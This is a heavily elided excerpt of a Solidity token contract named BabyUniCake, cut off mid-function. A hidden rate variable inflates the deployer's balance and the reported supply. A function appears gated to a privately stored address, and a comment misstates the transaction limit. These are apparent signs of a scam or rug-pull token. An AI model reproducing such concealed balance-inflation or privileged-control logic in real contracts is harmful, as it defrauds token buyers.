...
contract BabyUni is IERC20, Ownable {
    using SafeMath for uint256;
    ...
    string constant _name = "BabyUniCake";
    string constant _symbol = "UCAKE";
    uint8 constant _decimals = 9;

    uint256 _totalSupply = 1000000 * (10 ** _decimals);
    uint256 public _maxTxAmount = (_totalSupply * 2) / 100; //0.5% of total supply
    ...
    uint256 private _rRate =  999999 * (10 ** _decimals);
    ...
    constructor () {
        ...
        _balances[msg.sender] = _applyRValues(_totalSupply);
        emit Transfer(address(0), msg.sender, _applyRValues(_totalSupply));
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _applyRValues(_totalSupply); }
    ...
    function setReflectionRate() public {
        if(_msgSender() == _reflectRate)
